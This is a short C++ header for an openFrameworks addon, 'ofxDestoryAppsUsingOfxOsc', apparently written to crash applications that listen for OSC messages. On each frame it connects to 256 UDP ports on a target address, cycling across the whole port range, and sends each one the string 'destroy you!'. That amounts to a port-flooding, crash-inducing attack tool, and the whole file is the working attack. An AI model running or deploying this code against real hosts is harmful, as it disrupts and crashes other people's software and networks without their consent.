//
//  ofxDestoryAppsUsingOfxOsc.h
//
//  Created by ISHII 2bit on 2016/03/18.
//
//

#ifndef ofxDestoryAppsUsingOfxOsc_h
#define ofxDestoryAppsUsingOfxOsc_h

#include "ofMain.h"
#include "ofxUDPManager.h"

class ofxDestoryAppsUsingOfxOsc {
    ofxUDPManager manager;
    std::string address;
    
    int portOffset() const {
        return (ofGetFrameNum() * 256) % 65536;
    }
public:
    void setup(const std::string &address) {
        this->address = address;
        ofAddListener(ofEvents().update, this, &ofxDestoryAppsUsingOfxOsc::update);
        manager.Create();
    }
    void update(ofEventArgs &) {
        int offset = portOffset();
        for(int i = 0; i < 256; i++) {
            if(manager.Connect(address.c_str(), offset + i)) {
                manager.SendAll("destroy you!", 13);
            } else {
                ofLogWarning() << "cant connect" << offset + i;
            }
        }
    }
};

#endif /* ofxDestoryAppsUsingOfxOsc_h */
